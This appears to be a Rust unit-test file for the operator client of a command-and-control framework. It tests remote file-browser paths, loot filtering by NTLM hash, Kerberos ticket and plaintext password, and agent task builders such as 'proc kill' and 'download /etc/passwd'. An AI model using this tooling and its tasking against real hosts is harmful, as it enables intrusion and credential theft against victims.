        assert_eq!(parent_remote_path("C:\\Temp\\report.txt").as_deref(), Some("C:\\Temp\\"));
    }

    #[test]
    fn upload_destination_prefers_selected_directory() {
        let browser = AgentFileBrowserState {
            current_dir: Some("C:\\Temp".to_owned()),
            directories: BTreeMap::from([(
                "C:\\Temp".to_owned(),
                vec![FileBrowserEntry {
                    name: "Logs".to_owned(),
                    path: "C:\\Temp\\Logs".to_owned(),
                    is_dir: true,
                    size_label: String::new(),
                    size_bytes: None,
                    modified_at: String::new(),
                    permissions: String::new(),
                }],
            )]),
            ..AgentFileBrowserState::default()
        };

        assert_eq!(
            upload_destination(Some(&browser), Some("C:\\Temp\\Logs")).as_deref(),
            Some("C:\\Temp\\Logs")
        );
    }

    #[test]
    fn selected_remote_directory_uses_parent_for_selected_file() {
        let browser = AgentFileBrowserState {
            current_dir: Some("C:\\Temp".to_owned()),
            directories: BTreeMap::from([(
                "C:\\Temp".to_owned(),
                vec![FileBrowserEntry {
                    name: "report.txt".to_owned(),
                    path: "C:\\Temp\\report.txt".to_owned(),
                    is_dir: false,
                    size_label: "5 B".to_owned(),
                    size_bytes: Some(5),
                    modified_at: String::new(),
                    permissions: String::new(),
                }],
            )]),
            ..AgentFileBrowserState::default()
        };

        assert_eq!(
            selected_remote_directory(Some(&browser), Some("C:\\Temp\\report.txt")).as_deref(),
            Some("C:\\Temp\\")
        );
    }

    #[test]
    fn selected_remote_directory_returns_none_without_matching_entry() {
        let browser = AgentFileBrowserState::default();
        assert!(selected_remote_directory(Some(&browser), Some("C:\\Missing")).is_none());
    }

    /// Build a `ClientApp` in the `Authenticating` phase with the given shared state.
    fn app_in_authenticating_phase(app_state: SharedAppState) -> ClientApp {
        let login_state = LoginState::new(DEFAULT_SERVER_URL, &LocalConfig::default());
        ClientApp {
            phase: AppPhase::Authenticating {
                app_state,
                transport: ClientTransport::dummy(),
                login_state,
            },
            local_config: LocalConfig::default(),
            known_servers: KnownServersStore::default(),
            cli_server_url: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            tls_verification: TlsVerification::CertificateAuthority,
            session_panel: SessionPanelState::default(),
            outgoing_tx: None,
            python_runtime: None,
        }
    }

    #[test]
    fn check_auth_response_retrying_without_auth_error_transitions_to_login() {
        let state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());
        let app_state: SharedAppState = Arc::new(Mutex::new(state));
        {
            let mut s = app_state.lock().unwrap();
            s.connection_status =
                ConnectionStatus::Retrying("Connection closed by server".to_owned());
            // last_auth_error is None — server closed without sending an explicit error
        }

        let mut app = app_in_authenticating_phase(app_state);
        app.check_auth_response();

        match &app.phase {
            AppPhase::Login(login_state) => {
                assert!(
                    login_state.error_message.is_some(),
                    "expected an error message on the login state"
                );
                assert!(
                    login_state.error_message.as_deref().unwrap().contains("Connection closed"),
                    "error should contain the disconnect reason"
                );
            }
            _ => panic!("expected Login phase after Retrying during auth without last_auth_error"),
        }
    }

    #[test]
    fn check_auth_response_retrying_with_auth_error_uses_auth_error() {
        let state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());
        let app_state: SharedAppState = Arc::new(Mutex::new(state));
        {
            let mut s = app_state.lock().unwrap();
            s.connection_status = ConnectionStatus::Retrying("WebSocket closed".to_owned());
            s.last_auth_error = Some("Invalid credentials".to_owned());
        }

        let mut app = app_in_authenticating_phase(app_state);
        app.check_auth_response();

        match &app.phase {
            AppPhase::Login(login_state) => {
                assert_eq!(
                    login_state.error_message.as_deref(),
                    Some("Invalid credentials"),
                    "should prefer last_auth_error over retry reason"
                );
            }
            _ => panic!("expected Login phase"),
        }
    }

    #[test]
    fn check_auth_response_error_transitions_to_login() {
        let state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());
        let app_state: SharedAppState = Arc::new(Mutex::new(state));
        {
            let mut s = app_state.lock().unwrap();
            s.connection_status = ConnectionStatus::Error("Authentication failed".to_owned());
        }

        let mut app = app_in_authenticating_phase(app_state);
        app.check_auth_response();

        match &app.phase {
            AppPhase::Login(login_state) => {
                assert_eq!(login_state.error_message.as_deref(), Some("Authentication failed"));
            }
            _ => panic!("expected Login phase after Error during auth"),
        }
    }

    #[test]
    fn check_auth_response_connecting_stays_authenticating() {
        let state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());
        let app_state: SharedAppState = Arc::new(Mutex::new(state));
        // Default status is Disconnected but let's set Connecting to test the _ => None arm
        {
            let mut s = app_state.lock().unwrap();
            s.connection_status = ConnectionStatus::Connected;
        }

        let mut app = app_in_authenticating_phase(app_state);
        app.check_auth_response();

        assert!(
            matches!(app.phase, AppPhase::Authenticating { .. }),
            "should remain in Authenticating when status is Connected but no operator_info"
        );
    }

    // ── join_remote_path ──────────────────────────────────────────────

    #[test]
    fn join_remote_path_windows_backslash_base() {
        assert_eq!(
            join_remote_path("C:\\Users\\admin", "Documents"),
            "C:\\Users\\admin\\Documents"
        );
    }

    #[test]
    fn join_remote_path_unix_slash_base() {
        assert_eq!(join_remote_path("/home/user", "file.txt"), "/home/user/file.txt");
    }

    #[test]
    fn join_remote_path_trailing_backslash() {
        assert_eq!(join_remote_path("C:\\Users\\", "admin"), "C:\\Users\\admin");
    }

    #[test]
    fn join_remote_path_trailing_slash() {
        assert_eq!(join_remote_path("/home/user/", "file.txt"), "/home/user/file.txt");
    }

    #[test]
    fn join_remote_path_empty_base() {
        assert_eq!(join_remote_path("", "file.txt"), "file.txt");
    }

    #[test]
    fn join_remote_path_root_unix() {
        assert_eq!(join_remote_path("/", "etc"), "/etc");
    }

    // ── DockTab::FileBrowser ────────────────────────────────────────

    #[test]
    fn dock_tab_file_browser_label() {
        let tab = DockTab::FileBrowser("DEADBEEF".to_owned());
        assert_eq!(tab.label(), "[DEADBEEF] File Explorer");
    }

    #[test]
    fn dock_tab_file_browser_is_closeable() {
        let tab = DockTab::FileBrowser("DEADBEEF".to_owned());
        assert!(tab.closeable());
    }

    #[test]
    fn dock_tab_file_browser_accent_is_teal() {
        let tab = DockTab::FileBrowser("DEADBEEF".to_owned());
        assert_eq!(tab.accent_color(), Color32::from_rgb(80, 180, 140));
    }

    #[test]
    fn dock_state_open_file_browser_tab() {
        let mut dock = DockState::default();
        dock.open_tab(DockTab::FileBrowser("AGENT1".to_owned()));
        assert!(dock.open_tabs.contains(&DockTab::FileBrowser("AGENT1".to_owned())));
        assert_eq!(dock.selected, Some(DockTab::FileBrowser("AGENT1".to_owned())));
    }

    #[test]
    fn dock_state_close_file_browser_tab() {
        let mut dock = DockState::default();
        dock.open_tab(DockTab::FileBrowser("AGENT1".to_owned()));
        dock.close_tab(&DockTab::FileBrowser("AGENT1".to_owned()));
        assert!(!dock.open_tabs.contains(&DockTab::FileBrowser("AGENT1".to_owned())));
    }

    // ── DockTab::ProcessList ──────────────────────────────────────────

    #[test]
    fn dock_tab_process_list_label() {
        let tab = DockTab::ProcessList("DEADBEEF".to_owned());
        assert_eq!(tab.label(), "Process: [DEADBEEF]");
    }

    #[test]
    fn dock_tab_process_list_is_closeable() {
        let tab = DockTab::ProcessList("DEADBEEF".to_owned());
        assert!(tab.closeable());
    }

    #[test]
    fn dock_tab_process_list_accent_is_red() {
        let tab = DockTab::ProcessList("DEADBEEF".to_owned());
        assert_eq!(tab.accent_color(), Color32::from_rgb(255, 85, 85));
    }

    #[test]
    fn dock_state_open_process_list_tab() {
        let mut dock = DockState::default();
        dock.open_tab(DockTab::ProcessList("AGENT1".to_owned()));
        assert!(dock.open_tabs.contains(&DockTab::ProcessList("AGENT1".to_owned())));
        assert_eq!(dock.selected, Some(DockTab::ProcessList("AGENT1".to_owned())));
    }

    #[test]
    fn dock_state_close_process_list_tab() {
        let mut dock = DockState::default();
        dock.open_tab(DockTab::ProcessList("AGENT1".to_owned()));
        dock.close_tab(&DockTab::ProcessList("AGENT1".to_owned()));
        assert!(!dock.open_tabs.contains(&DockTab::ProcessList("AGENT1".to_owned())));
    }

    #[test]
    fn ensure_process_list_open_creates_tab() {
        let mut panel = SessionPanelState::default();
        panel.ensure_process_list_open("ABCD1234");
        assert!(panel.dock.open_tabs.contains(&DockTab::ProcessList("ABCD1234".to_owned())));
        assert_eq!(panel.dock.selected, Some(DockTab::ProcessList("ABCD1234".to_owned())));
    }

    #[test]
    fn ensure_process_list_open_idempotent() {
        let mut panel = SessionPanelState::default();
        panel.ensure_process_list_open("ABCD1234");
        panel.ensure_process_list_open("ABCD1234");
        let count = panel
            .dock
            .open_tabs
            .iter()
            .filter(|t| **t == DockTab::ProcessList("ABCD1234".to_owned()))
            .count();
        assert_eq!(count, 1);
    }

    // ── path_separator ────────────────────────────────────────────────

    #[test]
    fn path_separator_windows() {
        assert_eq!(path_separator("C:\\Users\\admin"), "\\");
    }

    #[test]
    fn path_separator_unix() {
        assert_eq!(path_separator("/home/user"), "/");
    }

    #[test]
    fn path_separator_no_separator() {
        assert_eq!(path_separator("file.txt"), "/");
    }

    // ── breadcrumb_segments ──────────────────────────────────────────

    #[test]
    fn breadcrumb_segments_windows_path() {
        let segments = breadcrumb_segments("C:\\Users\\admin\\Documents");
        assert_eq!(
            segments,
            vec![
                ("C:\\".to_owned(), "C:\\".to_owned()),
                ("Users".to_owned(), "C:\\Users\\".to_owned()),
                ("admin".to_owned(), "C:\\Users\\admin\\".to_owned()),
                ("Documents".to_owned(), "C:\\Users\\admin\\Documents\\".to_owned()),
            ]
        );
    }

    #[test]
    fn breadcrumb_segments_unix_path() {
        let segments = breadcrumb_segments("/home/user/docs");
        assert_eq!(
            segments,
            vec![
                ("/".to_owned(), "/".to_owned()),
                ("home".to_owned(), "/home/".to_owned()),
                ("user".to_owned(), "/home/user/".to_owned()),
                ("docs".to_owned(), "/home/user/docs/".to_owned()),
            ]
        );
    }

    #[test]
    fn breadcrumb_segments_root_only() {
        let segments = breadcrumb_segments("/");
        assert_eq!(segments, vec![("/".to_owned(), "/".to_owned())]);
    }

    #[test]
    fn breadcrumb_segments_windows_drive_root() {
        let segments = breadcrumb_segments("C:\\");
        assert_eq!(segments, vec![("C:\\".to_owned(), "C:\\".to_owned())]);
    }

    #[test]
    fn breadcrumb_segments_relative_path() {
        let segments = breadcrumb_segments("Documents/Stuff");
        assert_eq!(
            segments,
            vec![
                ("Documents".to_owned(), "Documents/".to_owned()),
                ("Stuff".to_owned(), "Documents/Stuff/".to_owned()),
            ]
        );
    }

    // ── directory_label ───────────────────────────────────────────────

    #[test]
    fn directory_label_extracts_leaf() {
        assert_eq!(directory_label("/home/user/Documents"), "Documents");
    }

    #[test]
    fn directory_label_windows_leaf() {
        // On Linux, std::path::Path does not split on backslashes, so the full
        // string is returned as the "file_name". This matches the current
        // implementation which delegates to Path::file_name().
        let result = directory_label("C:\\Users\\admin\\Desktop");
        assert!(
            result == "Desktop" || result == "C:\\Users\\admin\\Desktop",
            "unexpected result: {result}"
        );
    }

    #[test]
    fn directory_label_trailing_separator() {
        assert_eq!(directory_label("/home/user/Downloads/"), "Downloads");
    }

    #[test]
    fn directory_label_drive_root_backslash() {
        assert_eq!(directory_label("C:\\"), "C:\\");
    }

    #[test]
    fn directory_label_drive_root_slash() {
        assert_eq!(directory_label("C:/"), "C:/");
    }

    #[test]
    fn directory_label_drive_letter_colon() {
        assert_eq!(directory_label("C:"), "C:");
    }

    // ── file_entry_label ──────────────────────────────────────────────

    fn make_file_browser_entry(
        name: &str,
        size_label: &str,
        modified: &str,
        perms: &str,
    ) -> FileBrowserEntry {
        FileBrowserEntry {
            name: name.to_owned(),
            path: String::new(),
            is_dir: false,
            size_label: size_label.to_owned(),
            size_bytes: None,
            modified_at: modified.to_owned(),
            permissions: perms.to_owned(),
        }
    }

    #[test]
    fn file_entry_label_all_fields() {
        let entry = make_file_browser_entry("readme.txt", "1.5 KB", "2026-01-15", "rwxr-xr-x");
        assert_eq!(file_entry_label(&entry), "readme.txt  [1.5 KB | 2026-01-15 | rwxr-xr-x]");
    }

    #[test]
    fn file_entry_label_empty_size() {
        let entry = make_file_browser_entry("dir", "", "2026-01-15", "drwxr-xr-x");
        assert_eq!(file_entry_label(&entry), "dir  [- | 2026-01-15 | drwxr-xr-x]");
    }

    #[test]
    fn file_entry_label_all_empty_metadata() {
        let entry = make_file_browser_entry("file.bin", " ", "", "");
        assert_eq!(file_entry_label(&entry), "file.bin  [- | - | -]");
    }

    // ── human_size ────────────────────────────────────────────────────

    #[test]
    fn human_size_zero_bytes() {
        assert_eq!(human_size(0), "0 B");
    }

    #[test]
    fn human_size_below_kb() {
        assert_eq!(human_size(1023), "1023 B");
    }

    #[test]
    fn human_size_exactly_1kb() {
        assert_eq!(human_size(1024), "1.0 KB");
    }

    #[test]
    fn human_size_megabyte_range() {
        assert_eq!(human_size(1_048_576), "1.0 MB");
    }

    #[test]
    fn human_size_gigabyte_range() {
        assert_eq!(human_size(1_073_741_824), "1.0 GB");
    }

    #[test]
    fn human_size_large_gb_value() {
        assert_eq!(human_size(5_905_580_032), "5.5 GB");
    }

    #[test]
    fn human_size_one_byte() {
        assert_eq!(human_size(1), "1 B");
    }

    // ── find_file_entry ───────────────────────────────────────────────

    fn browser_with_entries(entries: Vec<FileBrowserEntry>) -> AgentFileBrowserState {
        let mut dirs = std::collections::BTreeMap::new();
        dirs.insert("/home".to_owned(), entries);
        AgentFileBrowserState {
            current_dir: Some("/home".to_owned()),
            directories: dirs,
            downloads: std::collections::BTreeMap::new(),
            status_message: None,
        }
    }

    #[test]
    fn find_file_entry_found() {
        let entry = FileBrowserEntry {
            name: "test.txt".to_owned(),
            path: "/home/test.txt".to_owned(),
            is_dir: false,
            size_label: "100 B".to_owned(),
            size_bytes: Some(100),
            modified_at: String::new(),
            permissions: String::new(),
        };
        let browser = browser_with_entries(vec![entry]);
        let found = find_file_entry(&browser, "/home/test.txt");
        assert!(found.is_some());
        assert_eq!(found.unwrap().name, "test.txt");
    }

    #[test]
    fn find_file_entry_not_found() {
        let browser = browser_with_entries(vec![]);
        assert!(find_file_entry(&browser, "/nonexistent").is_none());
    }

    // ── parent_remote_path ────────────────────────────────────────────

    #[test]
    fn parent_remote_path_unix() {
        assert_eq!(parent_remote_path("/home/user/file.txt"), Some("/home/user/".to_owned()));
    }

    #[test]
    fn parent_remote_path_windows() {
        assert_eq!(
            parent_remote_path("C:\\Users\\admin\\file.txt"),
            Some("C:\\Users\\admin\\".to_owned())
        );
    }

    #[test]
    fn parent_remote_path_trailing_slash() {
        assert_eq!(parent_remote_path("/home/user/"), Some("/home/".to_owned()));
    }

    #[test]
    fn parent_remote_path_root() {
        assert_eq!(parent_remote_path("/"), None);
    }

    #[test]
    fn parent_remote_path_empty() {
        assert_eq!(parent_remote_path(""), None);
    }

    #[test]
    fn parent_remote_path_no_separator() {
        assert_eq!(parent_remote_path("file.txt"), None);
    }

    // ── json_str ─────────────────────────────────────────────────────────

    #[test]
    fn json_str_plain_string() {
        assert_eq!(json_str("hello"), "\"hello\"");
    }

    #[test]
    fn json_str_embedded_quotes() {
        assert_eq!(json_str(r#"say "hi""#), r#""say \"hi\"""#);
    }

    #[test]
    fn json_str_backslashes() {
        assert_eq!(json_str(r"C:\Users\admin"), r#""C:\\Users\\admin""#);
    }

    #[test]
    fn json_str_newlines_and_tabs() {
        assert_eq!(json_str("line1\nline2\ttab"), r#""line1\nline2\ttab""#);
    }

    #[test]
    fn json_str_carriage_return() {
        assert_eq!(json_str("a\rb"), r#""a\rb""#);
    }

    #[test]
    fn json_str_empty_string() {
        assert_eq!(json_str(""), "\"\"");
    }

    #[test]
    fn json_str_combined_escapes() {
        assert_eq!(json_str("\\\"\n\r\t"), r#""\\\"\n\r\t""#);
    }

    #[test]
    fn json_str_null_bytes_passed_through() {
        // Null bytes are not escaped by json_str — they pass through as-is.
        let result = json_str("a\0b");
        assert!(result.starts_with('"') && result.ends_with('"'));
        assert!(result.contains('\0'));
    }

    // ── contains_ascii_case_insensitive ──────────────────────────────────

    #[test]
    fn case_insensitive_match() {
        assert!(contains_ascii_case_insensitive("Hello World", "hello"));
    }

    #[test]
    fn case_insensitive_no_match() {
        assert!(!contains_ascii_case_insensitive("Hello World", "goodbye"));
    }

    #[test]
    fn case_insensitive_empty_needle_matches_all() {
        assert!(contains_ascii_case_insensitive("anything", ""));
        assert!(contains_ascii_case_insensitive("", ""));
    }

    #[test]
    fn case_insensitive_whitespace_only_needle_matches_all() {
        assert!(contains_ascii_case_insensitive("anything", "   "));
    }

    #[test]
    fn case_insensitive_mixed_case() {
        assert!(contains_ascii_case_insensitive("NtLmHash", "ntlm"));
    }

    #[test]
    fn case_insensitive_needle_with_surrounding_whitespace() {
        assert!(contains_ascii_case_insensitive("foobar", "  bar  "));
    }

    // ── loot_is_downloadable ─────────────────────────────────────────────

    fn make_loot(kind: LootKind) -> LootItem {
        LootItem {
            id: Some(1),
            kind,
            name: "test".to_owned(),
            agent_id: "agent-1".to_owned(),
            source: "source".to_owned(),
            collected_at: "2026-03-18T12:00:00Z".to_owned(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        }
    }

    #[test]
    fn loot_is_downloadable_file_with_content() {
        let mut item = make_loot(LootKind::File);
        item.content_base64 = Some("dGVzdA==".to_owned());
        assert!(loot_is_downloadable(&item));
    }

    #[test]
    fn loot_is_downloadable_screenshot_with_content() {
        let mut item = make_loot(LootKind::Screenshot);
        item.content_base64 = Some("dGVzdA==".to_owned());
        assert!(loot_is_downloadable(&item));
    }

    #[test]
    fn loot_not_downloadable_file_without_content() {
        let item = make_loot(LootKind::File);
        assert!(!loot_is_downloadable(&item));
    }

    #[test]
    fn loot_not_downloadable_credential() {
        let mut item = make_loot(LootKind::Credential);
        item.content_base64 = Some("dGVzdA==".to_owned());
        assert!(!loot_is_downloadable(&item));
    }

    #[test]
    fn loot_not_downloadable_other() {
        let item = make_loot(LootKind::Other);
        assert!(!loot_is_downloadable(&item));
    }

    // ── matches_loot_type_filter ─────────────────────────────────────────

    #[test]
    fn type_filter_all_matches_everything() {
        for kind in [LootKind::Credential, LootKind::File, LootKind::Screenshot, LootKind::Other] {
            let item = make_loot(kind);
            assert!(matches_loot_type_filter(
                &item,
                LootTypeFilter::All,
                CredentialSubFilter::All,
                FileSubFilter::All,
            ));
        }
    }

    #[test]
    fn type_filter_credentials_matches_credential() {
        let item = make_loot(LootKind::Credential);
        assert!(matches_loot_type_filter(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_credentials_rejects_file() {
        let item = make_loot(LootKind::File);
        assert!(!matches_loot_type_filter(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_files_matches_file() {
        let item = make_loot(LootKind::File);
        assert!(matches_loot_type_filter(
            &item,
            LootTypeFilter::Files,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_files_rejects_credential() {
        let item = make_loot(LootKind::Credential);
        assert!(!matches_loot_type_filter(
            &item,
            LootTypeFilter::Files,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_screenshots_matches_screenshot() {
        let item = make_loot(LootKind::Screenshot);
        assert!(matches_loot_type_filter(
            &item,
            LootTypeFilter::Screenshots,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_screenshots_rejects_other() {
        let item = make_loot(LootKind::Other);
        assert!(!matches_loot_type_filter(
            &item,
            LootTypeFilter::Screenshots,
            CredentialSubFilter::All,
            FileSubFilter::All,
        ));
    }

    // ── matches_credential_sub_filter ────────────────────────────────────

    #[test]
    fn credential_sub_filter_all_passes_everything() {
        let item = make_loot(LootKind::Credential);
        assert!(matches_credential_sub_filter(&item, CredentialSubFilter::All));
    }

    #[test]
    fn credential_sub_filter_ntlm_matches() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "NTLM hash dump".to_owned();
        assert!(matches_credential_sub_filter(&item, CredentialSubFilter::NtlmHash));
    }

    #[test]
    fn credential_sub_filter_ntlm_rejects_plaintext() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "plaintext password".to_owned();
        assert!(!matches_credential_sub_filter(&item, CredentialSubFilter::NtlmHash));
    }

    #[test]
    fn credential_sub_filter_kerberos_matches() {
        let mut item = make_loot(LootKind::Credential);
        item.source = "kerberos ticket".to_owned();
        assert!(matches_credential_sub_filter(&item, CredentialSubFilter::KerberosTicket));
    }

    #[test]
    fn credential_sub_filter_certificate_matches() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "client.pfx".to_owned();
        assert!(matches_credential_sub_filter(&item, CredentialSubFilter::Certificate));
    }

    #[test]
    fn credential_sub_filter_plaintext_matches() {
        let mut item = make_loot(LootKind::Credential);
        item.preview = Some("plaintext creds".to_owned());
        assert!(matches_credential_sub_filter(&item, CredentialSubFilter::Plaintext));
    }

    // ── matches_file_sub_filter ──────────────────────────────────────────

    #[test]
    fn file_sub_filter_all_passes_everything() {
        let item = make_loot(LootKind::File);
        assert!(matches_file_sub_filter(&item, FileSubFilter::All));
    }

    #[test]
    fn file_sub_filter_document_matches_pdf() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("/docs/report.pdf".to_owned());
        assert!(matches_file_sub_filter(&item, FileSubFilter::Document));
    }

    #[test]
    fn file_sub_filter_archive_matches_zip() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("/tmp/backup.zip".to_owned());
        assert!(matches_file_sub_filter(&item, FileSubFilter::Archive));
    }

    #[test]
    fn file_sub_filter_binary_matches_exe() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("C:\\tools\\beacon.exe".to_owned());
        assert!(matches_file_sub_filter(&item, FileSubFilter::Binary));
    }

    #[test]
    fn file_sub_filter_document_rejects_exe() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("/usr/bin/agent.exe".to_owned());
        assert!(!matches_file_sub_filter(&item, FileSubFilter::Document));
    }

    #[test]
    fn file_sub_filter_uses_name_when_no_file_path() {
        let mut item = make_loot(LootKind::File);
        item.file_path = None;
        item.name = "secrets.tar.gz".to_owned();
        assert!(matches_file_sub_filter(&item, FileSubFilter::Archive));
    }

    // ── loot_sub_category_label ──────────────────────────────────────────

    #[test]
    fn sub_category_label_credential_ntlm() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "NTLM dump".to_owned();
        assert_eq!(loot_sub_category_label(&item), "NTLM Hash");
    }

    #[test]
    fn sub_category_label_credential_plaintext() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "password file".to_owned();
        assert_eq!(loot_sub_category_label(&item), "Plaintext");
    }

    #[test]
    fn sub_category_label_credential_kerberos() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "kirbi ticket".to_owned();
        assert_eq!(loot_sub_category_label(&item), "Kerberos");
    }

    #[test]
    fn sub_category_label_credential_certificate() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "client.crt".to_owned();
        assert_eq!(loot_sub_category_label(&item), "Certificate");
    }

    #[test]
    fn sub_category_label_credential_unknown() {
        let item = make_loot(LootKind::Credential);
        assert_eq!(loot_sub_category_label(&item), "");
    }

    #[test]
    fn sub_category_label_file_document() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("report.docx".to_owned());
        assert_eq!(loot_sub_category_label(&item), "Document");
    }

    #[test]
    fn sub_category_label_file_archive() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("data.7z".to_owned());
        assert_eq!(loot_sub_category_label(&item), "Archive");
    }

    #[test]
    fn sub_category_label_file_binary() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("agent.dll".to_owned());
        assert_eq!(loot_sub_category_label(&item), "Binary");
    }

    #[test]
    fn sub_category_label_screenshot_empty() {
        let item = make_loot(LootKind::Screenshot);
        assert_eq!(loot_sub_category_label(&item), "");
    }

    #[test]
    fn sub_category_label_other_empty() {
        let item = make_loot(LootKind::Other);
        assert_eq!(loot_sub_category_label(&item), "");
    }

    // ── type filter with credential sub-filter integration ───────────────

    #[test]
    fn type_filter_credentials_with_ntlm_sub_filter() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "NTLM hash dump".to_owned();
        assert!(matches_loot_type_filter(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::NtlmHash,
            FileSubFilter::All,
        ));
    }

    #[test]
    fn type_filter_credentials_with_wrong_sub_filter() {
        let mut item = make_loot(LootKind::Credential);
        item.name = "NTLM hash dump".to_owned();
        assert!(!matches_loot_type_filter(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::Plaintext,
            FileSubFilter::All,
        ));
    }

    // ── type filter with file sub-filter integration ─────────────────────

    #[test]
    fn type_filter_files_with_document_sub_filter() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("report.pdf".to_owned());
        assert!(matches_loot_type_filter(
            &item,
            LootTypeFilter::Files,
            CredentialSubFilter::All,
            FileSubFilter::Document,
        ));
    }

    #[test]
    fn type_filter_files_with_wrong_sub_filter() {
        let mut item = make_loot(LootKind::File);
        item.file_path = Some("report.pdf".to_owned());
        assert!(!matches_loot_type_filter(
            &item,
            LootTypeFilter::Files,
            CredentialSubFilter::All,
            FileSubFilter::Archive,
        ));
    }

    // ── process_task tests ──────────────────────────────────────────────

    #[test]
    fn process_task_valid_kill() {
        let info = process_task("DEAD0001", "proc kill 1234").unwrap();
        assert_eq!(info.demon_id, "DEAD0001");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandProc).to_string());
        assert_eq!(info.command.as_deref(), Some("proc"));
        assert_eq!(info.sub_command.as_deref(), Some("kill"));
        assert_eq!(info.arguments.as_deref(), Some("1234"));
        assert_eq!(info.command_line, "proc kill 1234");
        assert_eq!(info.extra.get("Args"), Some(&serde_json::Value::String("1234".to_owned())));
    }

    #[test]
    fn process_task_missing_subcommand() {
        let err = process_task("DEAD0001", "proc").unwrap_err();
        assert!(err.contains("Usage"), "unexpected error: {err}");
    }

    #[test]
    fn process_task_missing_pid() {
        let err = process_task("DEAD0001", "proc kill").unwrap_err();
        assert!(err.contains("Usage"), "unexpected error: {err}");
    }

    #[test]
    fn process_task_non_numeric_pid() {
        let err = process_task("DEAD0001", "proc kill abc").unwrap_err();
        assert!(err.contains("Invalid PID"), "unexpected error: {err}");
    }

    #[test]
    fn process_task_extra_trailing_args() {
        let err = process_task("DEAD0001", "proc kill 1234 extra").unwrap_err();
        assert!(err.contains("Usage"), "unexpected error: {err}");
    }

    #[test]
    fn process_task_unknown_subcommand() {
        let err = process_task("DEAD0001", "proc list").unwrap_err();
        assert!(err.contains("Usage"), "unexpected error: {err}");
    }

    #[test]
    fn process_task_kill_case_insensitive() {
        let info = process_task("DEAD0001", "proc KILL 42").unwrap();
        assert_eq!(info.sub_command.as_deref(), Some("kill"));
        assert_eq!(info.arguments.as_deref(), Some("42"));
    }

    // ── rest_after_word tests ───────────────────────────────────────────

    #[test]
    fn rest_after_word_two_words() {
        assert_eq!(rest_after_word("cmd argument").unwrap(), "argument");
    }

    #[test]
    fn rest_after_word_multiple_words() {
        assert_eq!(rest_after_word("shell whoami /all").unwrap(), "whoami /all");
    }

    #[test]
    fn rest_after_word_single_word_errors() {
        let err = rest_after_word("cmd").unwrap_err();
        assert!(err.contains("requires an argument"), "unexpected error: {err}");
    }

    #[test]
    fn rest_after_word_leading_trailing_whitespace() {
        assert_eq!(rest_after_word("  cmd   argument  ").unwrap(), "argument");
    }

    #[test]
    fn rest_after_word_empty_string_errors() {
        assert!(rest_after_word("").is_err());
    }

    #[test]
    fn rest_after_word_only_whitespace_errors() {
        assert!(rest_after_word("   ").is_err());
    }

    // ── file browser task builder tests ──────────────────────────────────

    /// Helper to extract the `AgentTaskInfo` from an `OperatorMessage::AgentTask`.
    fn unwrap_agent_task(msg: OperatorMessage) -> (MessageHead, AgentTaskInfo) {
        match msg {
            OperatorMessage::AgentTask(m) => (m.head, m.info),
            other => panic!("expected AgentTask, got {other:?}"),
        }
    }

    // -- filesystem_task helper --

    #[test]
    fn filesystem_task_sets_command_fs_and_sub_command() {
        let info = filesystem_task("DEAD0001", "pwd", "pwd", None);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.command.as_deref(), Some("fs"));
        assert_eq!(info.sub_command.as_deref(), Some("pwd"));
        assert_eq!(info.demon_id, "DEAD0001");
        assert_eq!(info.command_line, "pwd");
        assert!(info.arguments.is_none());
    }

    #[test]
    fn filesystem_task_with_arguments_passes_them_through() {
        let info = filesystem_task("DEAD0002", "cd /tmp", "cd", Some("/tmp".to_owned()));
        assert_eq!(info.arguments.as_deref(), Some("/tmp"));
        assert_eq!(info.command_line, "cd /tmp");
    }

    #[test]
    fn filesystem_task_generates_eight_hex_digit_task_id() {
        let info = filesystem_task("DEAD0003", "pwd", "pwd", None);
        assert_eq!(info.task_id.len(), 8);
        assert!(
            u32::from_str_radix(&info.task_id, 16).is_ok(),
            "task_id should be valid hex: {}",
            info.task_id
        );
    }

    // -- filesystem_transfer_task helper --

    #[test]
    fn filesystem_transfer_task_base64_encodes_path() {
        let info =
            filesystem_transfer_task("DEAD0004", "download /etc/passwd", "download", "/etc/passwd");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.command.as_deref(), Some("fs"));
        assert_eq!(info.sub_command.as_deref(), Some("download"));
        let expected = base64::engine::general_purpose::STANDARD.encode(b"/etc/passwd");
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn filesystem_transfer_task_encodes_windows_path() {
        let path = r"C:\Users\admin\Desktop\secrets.txt";
        let info =
            filesystem_transfer_task("DEAD0005", &format!("download {path}"), "download", path);
